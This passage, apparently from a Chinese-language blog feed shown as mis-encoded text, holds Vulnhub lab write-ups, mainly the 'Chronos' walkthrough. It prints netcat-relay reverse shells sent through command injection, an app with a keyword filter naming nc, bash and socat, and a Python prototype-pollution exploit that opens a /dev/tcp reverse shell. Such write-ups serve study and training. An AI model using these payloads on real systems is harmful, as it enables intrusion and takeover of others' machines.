<p>è§£é‡Šä¸€ä¸‹è¯¥æºç ï¼Œä»<code>argv[1]</code>çœ‹å‡ºè¯¥ç¨‹åºæ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œå¹¶ä¸”è¿™ä¸ªå‚æ•°å’Œ <code>freshclam</code> æ„æˆä¸€ä¸ª<code>command</code>ï¼Œç„¶å <code>system(command)</code> æ‰§è¡Œ å‘½ä»¤ã€‚å› æ­¤ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶çš„å°±æ˜¯ <code>argv[1]</code> è¿™ä¸ªå‚æ•°ã€‚</p>
<p>kaliå†å¼€ä¸¤ä¸ªå‘½ä»¤è¡Œçª—å£ï¼Œç„¶ååˆ†åˆ«æ‰§è¡Œï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. nc -lvnp 5555</span><br><span class="line">2. nc -lvnp 6666</span><br></pre></td></tr></table></figure></p>
<p>é¶æœºæ‰§è¡Œå¦‚ä¸‹payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./update_cloudav &quot;a|nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666&quot;</span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„ï¼Œï¼ˆ<strong>ä¸€å®šè¦åœ¨æœ€å‰é¢åŠ ä¸Š|,å°±ç®—æ²¡æœ‰aï¼Œä¹Ÿè¦æœ‰|</strong>ï¼‰è¿™æ ·æ„æˆçš„å‘½ä»¤å°±æ˜¯è¿™æ ·ï¼š <code>/usr/bin/freshclam a|nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„å‘½ä»¤ï¼Œæ˜¯å¯ä»¥è¢«æ‰§è¡Œçš„ã€‚</p>
<p>å¦‚æœå‰é¢æ²¡æœ‰|ï¼Œåˆ™æ„æˆ<code>/usr/bin/freshclam nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666</code>ï¼Œä¼šå…ˆæ‰§è¡Œ <code>/usr/bin/freshclam nc 192.168.137.104 5555</code>ï¼Œè¿™æ ·å­ncä¸²è”å°±æ–­å¼€äº†ï¼Œæ— æ³•è·å¾—shellã€‚</p>
<p>æœ€ç»ˆæˆåŠŸè·å¾— root æƒé™ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329225809.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>é€šè¿‡å¯¹è¯¥è™šæ‹Ÿæœºçš„æ¸—é€ï¼Œå­¦åˆ°äº†ï¼š</p>
<ol type="1">
<li><code>arping</code> è¿›è¡Œä¸»æœºå‘ç°</li>
<li>ncä¸²è”åå¼¹shell</li>
<li>suidææƒ</li>
</ol>
<p>ç–‘ç‚¹ï¼šè®¿é—® http æœåŠ¡é‚£æœ‰ä¸€ä¸ªåœ°æ–¹éœ€è¦è¾“å…¥ pin ç ï¼Œè¿˜æ²¡æ‰¾åˆ°</p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>3. Vulnhub Chronos Writeup</title>
    <url>/2022/04/01/3.%20Vulnhub%20Chronos%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ç®€å•ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼šhttps://www.vulnhub.com/entry/chronos-1,735/</p>
<p>éš¾åº¦ï¼šEasy</p>
<p>è™šæ‹Ÿæœºè½¯ä»¶ï¼šVirtual Box</p>
<p>ç›®æ ‡ï¼šå–å¾—2ä¸ªflagï¼Œè·å¾—rootæƒé™</p>
<p>æ¶‰åŠçš„æ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ç«¯å£æ‰«æ</li>
<li>webä¾¦å¯Ÿ</li>
<li>å‘½ä»¤æ³¨å…¥</li>
<li>æ•°æ®ç¼–ã€è§£ç </li>
<li><strong>æœç´¢å¤§æ³•</strong></li>
<li><strong>æ¡†æ¶æ¼æ´åˆ©ç”¨</strong></li>
<li>ä»£ç å®¡è®¡</li>
<li>NCä¸²è”</li>
<li>æœ¬åœ°ææƒ</li>
</ul>
<h1 id="æ¸—é€">æ¸—é€</h1>
<p>æ”»å‡»ä¸»æœº kaliï¼š<code>192.168.137.104</code></p>
<h2 id="ä¸»æœºå‘ç°">ä¸»æœºå‘ç°</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.137.0/16 </span><br><span class="line"></span><br><span class="line">å¦‚æœå®é™…çš„å­ç½‘æ©ç æ˜¯24ä½ï¼Œé‚£ä¹ˆä¸Šé¢æŸ¥è¯¢çš„æ—¶å€™å°±å‡8ï¼Œä¹Ÿå°±æ˜¯16ã€‚å®é™…æŸ¥è¯¢çš„å­ç½‘æ©ç ä½æ•°è®¾ç½®ä¸ºå®é™…çš„å­ç½‘æ©ç ä½æ•°å‡8æ•ˆæœæœ€å¥½ã€‚</span><br></pre></td></tr></table></figure>
<p>åŸç†ï¼šä¸å‰é¢çš„ä¸¤è€…ç›¸åŒï¼Œéƒ½æ˜¯é€šè¿‡ARPè§£æ</p>
<p>ç»“æœï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113217.png" /></p>
<p>å› æ­¤ï¼Œé¶æœºçš„IPä¸º 192.168.137.105</p>
<h2 id="ç«¯å£æ‰«æ">ç«¯å£æ‰«æ</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113352.png" /></p>
<h2 id="ç«¯å£æœåŠ¡å‘ç°">ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 192.168.137.105</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113546.png" /></p>
<p>ä¿¡æ¯ï¼š</p>
<ol type="1">
<li>22ç«¯å£ä¸Šçš„æœåŠ¡ä¸ºopenssh</li>
<li>80ç«¯å£ä¸Šçš„æœåŠ¡ä¸ºhttpï¼Œç‰ˆæœ¬ä¸º 2.4.29</li>
<li>8000ç«¯å£ä¸Šçš„æœåŠ¡ä¹Ÿæ˜¯httpï¼Œä½†æ˜¯ç”¨çš„ <code>node.js express framework</code></li>
<li>ç³»ç»Ÿä¸ºUbuntu</li>
</ol>
<h2 id="è®¿é—®httpæœåŠ¡">è®¿é—®httpæœåŠ¡</h2>
<p>æœ‰ä¸‰ä»¶äº‹å¿…é¡»åšï¼š</p>
<ol type="1">
<li>æŠ“åŒ…</li>
<li>çœ‹æºç </li>
<li>æ‰«ç›®å½•</li>
</ol>
<p>å‘ç°80ç«¯å£å’Œ8000ç«¯å£å¾ˆç±»ä¼¼ï¼ˆä¸€ä¸ªæœ´ç´ ï¼Œä¸€ä¸ªåä¸½ï¼‰ï¼Œæºç æ˜¯ä¸€æ ·çš„ï¼Œå…¶ä¸­æœ‰ä¸€ä¸²ç‰¹æ®Šçš„å­—ç¬¦ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _0x5bdf=[&#x27;150447srWefj&#x27;,&#x27;70lwLrol&#x27;,&#x27;1658165LmcNig&#x27;,&#x27;open&#x27;,&#x27;1260881JUqdKM&#x27;,&#x27;10737CrnEEe&#x27;,&#x27;2SjTdWC&#x27;,&#x27;readyState&#x27;,&#x27;responseText&#x27;,&#x27;1278676qXleJg&#x27;,&#x27;797116soVTES&#x27;,&#x27;onreadystatechange&#x27;,&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;,&#x27;User-Agent&#x27;,&#x27;status&#x27;,&#x27;1DYOODT&#x27;,&#x27;400909Mbbcfr&#x27;,&#x27;Chronos&#x27;,&#x27;2QRBPWS&#x27;,&#x27;getElementById&#x27;,&#x27;innerHTML&#x27;,&#x27;date&#x27;];(function(_0x506b95,_0x817e36)&#123;var _0x244260=_0x432d;while(!![])&#123;try&#123;var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;catch(_0x3fb1dc)&#123;_0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9)&#123;return _0x432d=function(_0x5bdf82,_0x432dc8)&#123;_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;&#125;,_0x432d(_0x16bd66,_0x33ffa9);&#125;function loadDoc()&#123;var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function()&#123;var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&amp;&amp;this[_0x146f5d(0x8c)]==0xc8&amp;&amp;(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);&#125;,_0x2beb35[_0x17df92(0x81)](&#x27;GET&#x27;,_0x17df92(0x8a),!![]),_0x2beb35[&#x27;setRequestHeader&#x27;](_0x17df92(0x8b),_0x1cff55),_0x2beb35[&#x27;send&#x27;]();&#125;</span><br></pre></td></tr></table></figure></p>
<p>ä¹ä¸€çœ‹ï¼Œå¥½åƒæ˜¯åŠ å¯†çš„jsä»£ç ã€‚è¿™é‡Œæ¨èä¸€ä¸ªç½‘å€ï¼Œå¯ä»¥å¯¹ä»£ç è¿›è¡Œç¾åŒ–å’Œç¼–ç è§£ç ï¼šhttps://gchq.github.io/CyberChef/</p>
<p>åˆ©ç”¨<code>javascript beautify</code>æ¨¡å—ç¾åŒ–ä¹‹åè™½ç„¶çœ‹çš„å¾ˆæ¸…æ¥šäº†ï¼Œä½†æ˜¯å› ä¸ºå„ç§å‚æ•°éƒ½åŠ å¯†äº†è¿˜æ˜¯æ— æ³•ç›´åˆ°è¿™æ®µä»£ç çš„æ„æ€ã€‚ä½†æ˜¯å…¶ä¸­æœ‰ä¸€ä¸²å­—ç¬¦æ²¡æœ‰åŠ å¯†ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure></p>
<p>æœ€åï¼ŒæŠ“åŒ…çœ‹ä¸€ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401114650.png" /></p>
<p>å‘ç°ç¡®å®æœ‰æ•°æ®åŒ…å¾€ chronos.local:8000 åœ°æ–¹å‘é€ï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•ç”¨æµè§ˆå™¨ç›´æ¥è®¿é—®ï¼Œå› ä¸ºkaliå¹¶ä¸çŸ¥é“chronos.localæ˜¯å“ªå°ä¸»æœºï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ï¼Œè¿™åº”è¯¥å°±æ˜¯é¶æœºã€‚å› æ­¤ï¼Œä¿®æ”¹<code>/etc/hosts</code>ï¼Œæ·»åŠ ä¸€æ¡è®°å½•ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120624.png" /></p>
<p>ç„¶åå¯ä»¥è®¿é—®äº†ï¼Œå¹¶ä¸”é¡µé¢å‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120700.png" /></p>
<p>ç»“åˆurlåˆ†æï¼Œå‘ç°urlä¸­çš„é‚£ä¸€ä¸²å­—ç¬¦åƒæ˜¯è­¦å‘Šbase64ç¼–ç çš„ï¼Œå› æ­¤ï¼Œå†æ¬¡åˆ©ç”¨åˆšåˆšçš„ç½‘å€è¿›è¡Œè§£ç ã€‚åˆ©ç”¨ <code>magic</code> æ¨¡å—è¿›è¡Œè§£ç ï¼Œå‘ç°æ˜¯base58ç¼–ç ã€‚å¾—åˆ°è§£ç åçš„ç»“æœï¼š<code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></p>
<blockquote>
<p>baseç³»åˆ—æœ‰è®¸å¤šï¼Œä½†æ˜¯å¸¸è§çš„æ˜¯base64å’Œbase32ã€‚è¿˜æœ‰è®¸å¤šä¸å¸¸è§çš„ï¼Œæ¯”å¦‚è¿™é‡Œçš„base58ã€‚</p>
</blockquote>
<ol type="1">
<li>date</li>
<li><code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></li>
<li>é¡µé¢ä¸Šæ˜¾ç¤ºçš„æ—¶é—´ä¿¡æ¯</li>
</ol>
<p>è¿™è®©æˆ‘æƒ³åˆ°Linuxä¸­çš„dateå‘½ä»¤ï¼Œä¹Ÿæ˜¯èƒ½å¤Ÿæ˜¾ç¤ºæ—¶é—´ï¼Œå› æ­¤åœ¨kaliä¸Šå°è¯•ä¸€ä¸‹å¦‚ä¸‹ä»£ç ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401121236.png" /></p>
<p>å‘ç°ç»“æœå’Œé¡µé¢æ˜¾ç¤ºçš„ä¸€æ¨¡ä¸€æ ·ï¼ˆæœªç»è¿‡æ¸²æŸ“ï¼‰ã€‚å› æ­¤ï¼Œæœ‰ç†ç”±æ€€ç–‘åå°æœåŠ¡è°ƒç”¨äº†ç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶ä¸”åå°ä»£ç å¯èƒ½å¦‚ä¸‹ï¼ˆçŒœæµ‹ï¼Œå¹¶ä¸æ˜¯çœŸæ­£çš„ä»£ç ï¼Œåªæ˜¯è¯´æ˜ä»£ç é€»è¾‘ï¼‰ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;date&#x27; .$format;</span><br><span class="line">system(cmd);</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœæˆ‘ä»¬ä»€ä¹ˆéƒ½ä¸ä¿®æ”¹ï¼Œé‚£ä¹ˆæ‰§è¡Œçš„å‘½ä»¤å°±æ˜¯<code>date '+Today is %A, %B %d, %Y %H:%M:%S.'</code>ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘åˆ°Linuxä¸­ä»¥ä¸‹æ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼ˆä¸Šå‘¨ä½¿ç”¨çš„æ˜¯ç®¡é“ç¬¦ï¼Œè¿™å‘¨ä½¿ç”¨ <code>$$</code>ï¼Œè¯¥ç¬¦å·åªæœ‰åœ¨å‰é¢çš„å‘½ä»¤æ­£ç¡®æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œæ‰ä¼šæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼‰</p>
<p>å…ˆåšä¸€ä¸ªå°è¯•ï¼Œ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;ls -&gt; yZSGA</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401134641.png" /></p>
<p>æˆåŠŸæ‰§è¡Œï¼Œå› æ­¤è¿™é‡Œç¡®å®è°ƒç”¨äº†ç³»ç»Ÿå‘½ä»¤ã€‚æ¥ä¸‹æ¥ä½¿ç”¨ncä¸²è”æ¥åå¼¹shellï¼ˆå…ˆåˆ¤æ–­æ˜¯å¦æœ‰ncï¼Œç„¶åå†åˆ¤æ–­æ˜¯å¦æœ‰ -eï¼‰</p>
<h2 id="åå¼¹shell">åå¼¹shell</h2>
<p>é¦–å…ˆåœ¨kaliä¸Šå¯åŠ¨ä¸¤ä¸ªç›‘å¬ç«¯å£ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 3333</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>ç„¶åå°†payload base58ç¼–ç ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 192.168.137.104 3333|/bin/bash|nc 192.168.137.104 4444</span><br><span class="line">2XqeYgBDNepmM9vgTVeLGrep4fZHdsG5tAFHFFoH1pgfmPx59cE4Pphh2FNWaHBapy5Tin3Vs6E4MYXhu</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135228.png" /></p>
<p>è™½ç„¶æç¤ºå‡ºé”™ï¼Œä½†æ˜¯kaliå·²ç»æˆåŠŸè¿æ¥ä¸Šäº†</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135325.png" /></p>
<p>æ¥ä¸‹æ¥è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼š</p>
<p>å‘ç°åœ¨ <code>/home/imera</code> ç›®å½•ä¸‹æœ‰ä¸€ä¸ª<code>user.txt</code>æ–‡ä»¶ï¼Œä½†æ˜¯å´æ²¡æœ‰æƒé™è¯»å–ï¼Œè¿™åº”è¯¥å°±æ˜¯å…¶ä¸­ä¸€ä¸ªflagäº†ã€‚å¹¶ä¸”åœ¨<code>/root</code>ç›®å½•ä¸‹ä¹Ÿæœ‰ä¸€ä¸ªflagï¼Œè¿™åº”è¯¥æ˜¯ç¬¬äºŒä¸ªflagï¼Œä¸å‡ºæ„æ–™ä¹Ÿæ²¡æœ‰æƒé™è¯»å–ã€‚</p>
<p>è¿˜å¯ä»¥çœ‹ä¸€ä¸‹ <code>app.js</code> <code>package.jsom</code> å’Œ <code>package-lock.json</code> çš„å†…å®¹ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªçš„æºç å¦‚ä¸‹ï¼š <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;exec&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line">app.use(cors());</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.sendFile(<span class="string">&#x27;/var/www/html/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> agent = req.headers[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;</span><br><span class="line">	<span class="keyword">const</span> format = req.query.format;</span><br><span class="line">	<span class="keyword">const</span> bytes = bs58.decode(format);</span><br><span class="line">	<span class="keyword">var</span> decoded = bytes.toString();</span><br><span class="line">	<span class="keyword">var</span> concat = cmd.concat(decoded);</span><br><span class="line">	<span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (concat.includes(<span class="string">&#x27;id&#x27;</span>) || concat.includes(<span class="string">&#x27;whoami&#x27;</span>) || concat.includes(<span class="string">&#x27;python&#x27;</span>) || concat.includes(<span class="string">&#x27;nc&#x27;</span>) || concat.includes(<span class="string">&#x27;bash&#x27;</span>) || concat.includes(<span class="string">&#x27;php&#x27;</span>) || concat.includes(<span class="string">&#x27;which&#x27;</span>) || concat.includes(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">			res.send(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		exec(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (error) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123; error.message &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123; stderr &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res.send(stdout);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.send(<span class="string">&#x27;Permission Denied&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`Server running at <span class="subst">$&#123; port &#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>ä¸Šè¿°ä»£ç ä¸­å°±å¯ä»¥éªŒè¯ç¡®å®æ˜¯æ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶ä¸”è¿˜è®°å¾—ä¹‹å‰å¼¹å‡ºçš„â€œsomething went wrongâ€å—ï¼Ÿè¿™æ˜¯å› ä¸ºè¿™é‡Œåšäº†è¿‡æ»¤ï¼Œä½†æ˜¯ä»…ä»…åªæ˜¯åˆ¤æ–­äº†ä»¥ä¸‹ï¼Œå¹¶æ²¡æœ‰é˜»æ­¢å‘½ä»¤æ‰§è¡Œã€‚è¿™å°±å«ç™¾å¯†ä¸€ç–å§ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªç›®å½• <code>/opt/chronos-v2</code>ï¼Œé‡Œé¢æœ‰ä¸€ä¸ª<code>backend</code>çš„ç›®å½•ï¼Œè¿™ä¸€çœ‹å°±æ˜¯ä¸åå°æœ‰å…³ã€‚é‡Œé¢æœ‰ä¸€ä¸ª<code>server.js</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(fileupload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;/opt/chronos-v2/frontend/pages&#x27;</span>);</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> server = http.Server(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.listen(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>ä»è¿™é‡Œèƒ½çœ‹å‡ºæœ‰ä¸€ä¸ª8080ç«¯å£ï¼Œä½†æ˜¯åªèƒ½é€šè¿‡127.0.0.1æ‰èƒ½è®¿é—®ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆç«¯å£æ‰«é¢æ— æ³•å¾—åˆ°è¿™ä¸ªç«¯å£ã€‚</p>
<p>ä¿¡æ¯æ”¶é›†å·®ä¸å¤šï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯è¦ææƒäº†ã€‚</p>
<h2 id="æƒé™æå‡-æœ¬åœ°ææƒ">æƒé™æå‡-æœ¬åœ°ææƒ</h2>
<p>Linuxææƒå¸¸ç”¨çš„ä¸‰ç§æ–¹å¼ï¼š</p>
<ol type="1">
<li>å†…æ ¸æ¼æ´</li>
<li>suidææƒ</li>
<li>sudoé…ç½®ä¸å½“ææƒ</li>
</ol>
<p>è¿™é‡Œç»è¿‡æµ‹è¯•å‘ç°å‰ä¸¤è€…éƒ½ä¸è¡Œã€‚å› æ­¤å¾—å¦æƒ³åŠæ³•ï¼Œå¿½ç„¶æƒ³åˆ°ä¹‹å‰ä¿¡æ¯æ”¶é›†å¾—åˆ°äº†ä¸€ä¸ªæŠ€æœ¯ node.jsã€‚æŸ¥çœ‹äº†<code>/chronos-v2/backend/package.json</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401142659.png" /></p>
<p>è¿™é‡Œçš„æ˜¯å¦å­˜åœ¨æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ï¼Ÿå› æ­¤å»æœä¸€ä¸‹ï¼Œå‘ç°è™½ç„¶ä¸å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä½†æ˜¯å­˜åœ¨node.jsçš„åŸå‹é“¾æ±¡æŸ“ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ¼æ´è¿›è¡Œææƒã€‚</p>
<p>åšå®¢åœ°å€å¦‚ä¸‹ï¼šhttps://blog.p6.is/Real-World-JS-1/</p>
<p>è¿˜æä¾›äº†expï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.137.104/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>ï¼ˆç¬¬ä¸€ä¸ªipä¸ºé¶æœºIPï¼Œåé¢ä¸¤ä¸ªçš„ç«¯å£ä¸ºnode.jsæ‰€åœ¨ç«¯å£ï¼Œä¹Ÿå°±æ˜¯8080ï¼Œä»åˆšåˆšçš„ä¿¡æ¯æ”¶é›†ä¸­çŸ¥é“ï¼‰</p>
<p>åœ¨kaliä¸Šç¼–å†™ä¸Šé¢çš„ç¨‹åºï¼Œç„¶åå¼€å¯httpæœåŠ¡ï¼Œè®©é¶æœºä¸‹è½½è¿™ä¸ªæ–‡ä»¶ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: python -m SimpleHTTPServer 80</span><br><span class="line">é¶æœº: </span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.137.104/exp.py</span><br></pre></td></tr></table></figure></p>
<p>ç„¶åkaliç›‘å¬8888ç«¯å£ï¼Œé¶æœºæ‰§è¡Œè¯¥ç¨‹åº <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: nc -lvnp 8888</span><br><span class="line">é¶æœº: </span><br><span class="line">	chmod +x exp.py</span><br><span class="line">	python3 exp.py</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145431.png" /></p>
